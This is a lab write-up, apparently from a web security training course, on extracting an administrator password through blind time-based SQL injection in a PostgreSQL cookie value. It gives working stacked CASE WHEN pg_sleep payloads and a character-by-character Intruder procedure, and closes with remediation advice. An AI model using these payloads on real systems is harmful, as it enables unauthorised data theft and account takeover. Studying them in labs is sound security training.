# Lab: Blind SQL injection with time delays and information retrieval

Blind timing turns a stopwatch into your debugger. The idea is simple and the execution is tedious, and this lab is where the tedium shows up.

## The setup

Same shop, same `TrackingId` cookie, same analytics query on every request. The database is PostgreSQL. Results are never returned and errors do not change the response either, so there is nothing in the page to read.

What is different is the goal. There is a `users` table with `username` and `password` columns, and I have to recover the `administrator` password and log in with it. One boolean question per request, one second of patience per question.

## How the vulnerability works

An unconditional `pg_sleep(10)` proves the injection but tells me nothing else. To extract data I need the delay to depend on a condition I choose.

`CASE WHEN <condition> THEN pg_sleep(10) ELSE pg_sleep(0) END` gives exactly that. When the condition is true the response crawls; when it is false it returns at once. That turns the clock into a yes/no oracle I can point at any comparison.

On this lab the cookie value can start a fresh statement, so I can stack my own `SELECT` against `users` instead of squeezing it into the original query.

## Solving it

1. Confirm the injection with a condition that is always true, then always false:

```
TrackingId=x';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
TrackingId=x';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

The first sleeps for ten seconds, the second returns immediately.

2. Confirm the target row exists:

```
TrackingId=x';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

3. Find the password length by raising the bound until the delay stops:

```
TrackingId=x';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

The password turns out to be 20 characters long.

4. Send the request to Intruder and put a payload marker around the comparison character, using a single-threaded resource pool so overlapping requests do not blur the timing:

```
TrackingId=x';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='§a§') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

Payloads are `a` to `z` and `0` to `9`. In the results, the row showing roughly 10,000 ms in the "Response received" column is the correct character.

5. Move the `SUBSTRING` offset from 1 to 2, then 3, and so on to 20, reading one character each round. Then log in as `administrator`.

## Why that payload works

The `;` ends the original statement and starts a new one, which is why this payload looks heavier than the plain `||pg_sleep(10)` from the previous lab. `CASE WHEN` returns one of two branches, and only the true branch calls `pg_sleep(10)`. The `ELSE pg_sleep(0)` keeps the false path instant, so the gap between the two cases is unambiguous. `FROM users` scopes the subquery to the table holding the password.

## The fix

Parameterise the analytics query so the cookie is bound as a value. Then turn off stacked or multi-statement execution at the driver, so a single quote cannot start a second statement. Least privilege on the database user limits what an oracle like this can even reach, and a request timeout caps how long one injected sleep can hold a thread.
